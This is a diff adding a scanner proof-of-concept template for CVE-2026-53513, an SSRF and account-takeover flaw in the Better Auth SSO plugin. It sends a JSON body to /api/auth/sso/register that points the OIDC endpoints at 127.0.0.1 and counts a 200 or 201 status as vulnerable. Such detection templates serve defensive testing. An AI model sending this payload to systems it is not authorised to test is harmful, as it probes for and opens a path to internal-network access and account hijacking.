@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "检测 @better-auth/sso 插件中的 SSRF 漏洞。当 skipDiscovery: true 时，POST /sso/register 端点接受未经验证的 OIDC 端点 URL（userInfoEndpoint、tokenEndpoint、jwksEndpoint），服务端在 OIDC 回调期间向这些 URL 发起服务端请求，导致非盲 SSRF 及账户劫持。本 PoC 通过提交包含内网地址的 OIDC 配置来检测服务端是否缺乏 URL 验证，补丁版本 1.6.11 会拒绝私有网络 URL。"
+id = "POC-AVE-2026-0403"
+name = "CVE-2026-53513 Better Auth SSRF via OIDC Endpoints PoC"
+severity = "critical"
+tags = ["cve-2026-53513"]
+vuln_id = [
+    "CVE-2026-53513",
+    "AVE-2026-0403",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/auth/sso/register"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"providerId":"ave-ssrf-test","displayName":"AVE Detection","oidcConfig":{"skipDiscovery":true,"userInfoEndpoint":"http://127.0.0.1:1/","tokenEndpoint":"http://127.0.0.1:1/","jwksEndpoint":"http://127.0.0.1:1/"},"trustEmailVerified":false}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+]
+type = "status"
